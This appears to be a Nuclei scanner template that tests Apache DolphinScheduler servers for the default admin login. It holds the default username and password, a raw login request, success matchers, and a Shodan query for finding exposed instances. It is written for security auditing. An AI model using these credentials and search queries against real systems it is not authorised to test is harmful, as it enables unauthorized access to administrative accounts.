id: dolphinscheduler-default-login
info:
  name: Apache DolphinScheduler Default Login
  author: For3stCo1d
  severity: high
  description: Apache DolphinScheduler default admin credentials were discovered.
  reference:
    - https://github.com/apache/dolphinscheduler
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:apache:dolphinscheduler:*:*:*:*:*:*:*:*
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "DolphinScheduler"})
    max-request: 1
    product: dolphinscheduler
    shodan-query: http.title:"DolphinScheduler"
    vendor: apache
  tags: apache,default-login,dolphinscheduler,oss,vuln
http:
  - attack: pitchfork
    matchers:
      - condition: and
        part: body
        type: word
        words:
          - '"msg":"login success"'
          - '"sessionId":'
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      pass:
        - dolphinscheduler123
      user:
        - admin
    raw:
      - |
        POST /dolphinscheduler/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        userName={{user}}&userPassword={{pass}}
